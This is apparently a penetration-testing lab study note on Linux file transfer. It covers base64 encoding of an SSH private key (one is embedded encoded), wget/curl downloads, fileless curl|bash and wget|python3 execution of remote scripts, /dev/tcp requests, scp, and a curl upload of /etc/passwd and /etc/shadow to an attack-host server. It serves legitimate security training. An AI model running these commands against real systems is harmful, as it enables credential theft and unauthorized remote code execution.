### Base64 Encoding/Decoding

Refer to [[1. Windows File Transfer Methods]]

#### Encoding 
```shell-session
cat id_rsa |base64 -w 0;echo
```

#### Decoding

```shell-session
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```


#### Download a File Using wget

```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### Download a File Using cURL

```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### File-less Download with cURL (Directly executing without downloading using pipes)

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### File-less Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


## Download with Bash (/dev/tcp)
- Can be performed as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections).

#### Connect to the Target Webserver

```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

```shell-session
cat <&3
```


## SSH Downloads
- SCP (Secure Copy), built in utility in ssh, can be used to transfer to and from the attack host.
###### Enable SSH

```
sudo sysemctl enable ssh
sudo systemctl start ssh
```

###### Checking for SSH Listening Port

```
netstat -lnpt
```

| **Flag** | **Full Name** | **Purpose**                                            |
| -------- | ------------- | ------------------------------------------------------ |
| **-l**   | Listening     | Filter for services waiting for incoming traffic.      |
| **-n**   | Numeric       | Show numbers (IPs/Ports) instead of names; saves time. |
| **-p**   | Program       | Identify which specific app/process is using the port. |
| **-t**   | TCP           | Only show Transmission Control Protocol connections.   |

#### Linux - Downloading Files Using SCP

```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Upload Operations

#### Web Upload
- Similar to what we did in in windows.
- We use uploadserver module.
```
sudo python3 -m pip install --user uploadserver
```
#### Pwnbox - Create a Self-Signed Certificate

```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
> The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

```shell-session
mkdir https && cd https
```

```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### Linux - Upload Multiple Files

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
